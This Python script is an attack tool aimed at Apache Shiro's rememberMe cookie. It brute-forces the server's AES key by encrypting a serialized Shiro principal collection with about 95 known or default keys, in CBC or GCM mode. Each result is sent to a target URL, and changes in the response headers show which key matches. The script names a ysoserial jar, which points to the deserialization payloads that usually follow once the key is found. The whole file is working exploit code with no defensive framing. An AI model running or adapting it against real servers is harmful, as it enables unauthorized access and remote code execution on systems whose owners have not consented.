# coding: utf-8

import os
import argparse
import re
import base64
import sys
import uuid
import subprocess
import requests
import urllib3
from Crypto.Cipher import AES

PROXY = {}
myheader = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0',
}
JAR_FILE = 'ysoserial-0.0.6-SNAPSHOT-all.jar'

keys = [
            
            "4AvVhmFLUs0KTA3Kprsdag==",
            "kPH+bIxk5D2deZiIxcaaaA==",
            "Z3VucwAAAAAAAAAAAAAAAA==",
            "fCq+/xW488hMTCD+cmJ3aQ==",
            "0AvVhmFLUs0KTA3Kprsdag==",
            "1AvVhdsgUs0FSA3SDFAdag==",
            "1QWLxg+NYmxraMoxAXu/Iw==",
            "25BsmdYwjnfcWmnhAciDDg==",
            "2AvVhdsgUs0FSA3SDFAdag==",
            "3AvVhmFLUs0KTA3Kprsdag==",
            "3JvYhmBLUs0ETA5Kprsdag==",
            "r0e3c16IdVkouZgk1TKVMg==",
            "5aaC5qKm5oqA5pyvAAAAAA==",
            "5AvVhmFLUs0KTA3Kprsdag==",
            "6AvVhmFLUs0KTA3Kprsdag==",
            "6NfXkC7YVCV5DASIrEm1Rg==",
            "6ZmI6I2j5Y+R5aSn5ZOlAA==",
            "cmVtZW1iZXJNZQAAAAAAAA==",
            "7AvVhmFLUs0KTA3Kprsdag==",
            "8AvVhmFLUs0KTA3Kprsdag==",
            "8BvVhmFLUs0KTA3Kprsdag==",
            "9AvVhmFLUs0KTA3Kprsdag==",
            "OUHYQzxQ/W9e/UjiAGu6rg==",
            "a3dvbmcAAAAAAAAAAAAAAA==",
            "aU1pcmFjbGVpTWlyYWNsZQ==",
            "bWljcm9zAAAAAAAAAAAAAA==",
            "bWluZS1hc3NldC1rZXk6QQ==",
            "bXRvbnMAAAAAAAAAAAAAAA==",
            "ZUdsaGJuSmxibVI2ZHc9PQ==",
            "wGiHplamyXlVB11UXWol8g==",
            "U3ByaW5nQmxhZGUAAAAAAA==",
            "MTIzNDU2Nzg5MGFiY2RlZg==",
            "L7RioUULEFhRyxM7a2R/Yg==",
            "a2VlcE9uR29pbmdBbmRGaQ==",
            "WcfHGU25gNnTxTlmJMeSpw==",
            "OY//C4rhfwNxCQAQCrQQ1Q==",
            "5J7bIJIV0LQSN3c9LPitBQ==",
            "f/SY5TIve5WWzT4aQlABJA==",
            "bya2HkYo57u6fWh5theAWw==",
            "WuB+y2gcHRnY2Lg9+Aqmqg==",
            "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
            "3qDVdLawoIr1xFd6ietnwg==",
            "YI1+nBV//m7ELrIyDHm6DQ==",
            "6Zm+6I2j5Y+R5aS+5ZOlAA==",
            "2A2V+RFLUs+eTA3Kpr+dag==",
            "6ZmI6I2j3Y+R1aSn5BOlAA==",
            "SkZpbmFsQmxhZGUAAAAAAA==",
            "2cVtiE83c4lIrELJwKGJUw==",
            "fsHspZw/92PrS3XrPW+vxw==",
            "XTx6CKLo/SdSgub+OPHSrw==",
            "sHdIjUN6tzhl8xZMG3ULCQ==",
            "O4pdf+7e+mZe8NyxMTPJmQ==",
            "HWrBltGvEZc14h9VpMvZWw==",
            "rPNqM6uKFCyaL10AK51UkQ==",
            "Y1JxNSPXVwMkyvES/kJGeQ==",
            "lT2UvDUmQwewm6mMoiw4Ig==",
            "MPdCMZ9urzEA50JDlDYYDg==",
            "xVmmoltfpb8tTceuT5R7Bw==",
            "c+3hFGPjbgzGdrC+MHgoRQ==",
            "ClLk69oNcA3m+s0jIMIkpg==",
            "Bf7MfkNR0axGGptozrebag==",
            "1tC/xrDYs8ey+sa3emtiYw==",
            "ZmFsYWRvLnh5ei5zaGlybw==",
            "cGhyYWNrY3RmREUhfiMkZA==",
            "IduElDUpDDXE677ZkhhKnQ==",
            "yeAAo1E8BOeAYfBlm4NG9Q==",
            "cGljYXMAAAAAAAAAAAAAAA==",
            "2itfW92XazYRi5ltW0M2yA==",
            "XgGkgqGqYrix9lI6vxcrRw==",
            "ertVhmFLUs0KTA3Kprsdag==",
            "5AvVhmFLUS0ATA4Kprsdag==",
            "s0KTA3mFLUprK4AvVhsdag==",
            "hBlzKg78ajaZuTE0VLzDDg==",
            "9FvVhtFLUs0KnA3Kprsdyg==",
            "d2ViUmVtZW1iZXJNZUtleQ==",
            "yNeUgSzL/CfiWw1GALg6Ag==",
            "NGk/3cQ6F5/UNPRh8LpMIg==",
            "4BvVhmFLUs0KTA3Kprsdag==",
            "MzVeSkYyWTI2OFVLZjRzZg==",
            "empodDEyMwAAAAAAAAAAAA==",
            "A7UzJgh1+EWj5oBFi+mSgw==",
            "c2hpcm9fYmF0aXMzMgAAAA==",
            "i45FVt72K2kLgvFrJtoZRw==",
            "U3BAbW5nQmxhZGUAAAAAAA==",
            "ZnJlc2h6Y24xMjM0NTY3OA==",
            "Jt3C93kMR9D5e8QzwfsiMw==",
            "MTIzNDU2NzgxMjM0NTY3OA==",
            "vXP33AonIp9bFwGl7aT7rA==",
            "V2hhdCBUaGUgSGVsbAAAAA==",
            "Q01TX0JGTFlLRVlfMjAxOQ==",
            "ZAvph3dsQs0FSL3SDFAdag==",
            "Is9zJ3pzNh2cgTHB4ua3+Q==",
            "NsZXjXVklWPZwOfkvk6kUA==",
            "GAevYnznvgNCURavBhCr1w==",
            "66v1O8keKNV3TTcGPK1wzg==",
            "SDKOLKn2J1j/2BHjeZwAoQ=="
]

checkdata = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="


def getKey(url,ciphertype):

    r1 = requests.get(target, cookies={'rememberMe': "123"}, timeout=10, proxies=PROXY,
                         verify=False, headers=myheader,allow_redirects=False)
    rsp1=len(str(r1.headers))
    
    try:
        for key in keys:
            print("[-] start key: {0}".format(key))
            if ciphertype == 'CBC':
                payload = CBCCipher(key,base64.b64decode(checkdata))
            if ciphertype == 'GCM':
                payload = GCMCipher(key,base64.b64decode(checkdata))
        
            payload = payload.decode()
        #print(payload)
            r = requests.get(target, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
                         verify=False, headers=myheader,allow_redirects=False)  # 发送验证请求
            rsp = len(str(r.headers))
            if rsp1 != rsp and r.status_code != 400:
                print("!! Get key: {0}".format(key))
                exit()
    except Exception as e:
        print(e)
        pass
    return False

#1.4.2及以上版本使用GCM加密
def GCMCipher(key,file_body):
    iv = os.urandom(16)
    cipher = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)          
    ciphertext, tag = cipher.encrypt_and_digest(file_body) 
    ciphertext = ciphertext + tag   
    base64_ciphertext = base64.b64encode(iv + ciphertext)
    return base64_ciphertext


def CBCCipher(key,file_body):
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    file_body = pad(file_body)
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    #parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-U', '--url', help="target url", required=True)
    parser.add_argument('-T', '--ciphertype', help='CipherType, GCM or CBC', required=True)
    args = parser.parse_args()
    if '://' not in args.url:
        target = 'https://%s' % args.url if ':443' in args.url else 'http://%s' % args.url
    else:
        target = args.url

    
    getKey(target,args.ciphertype)
        

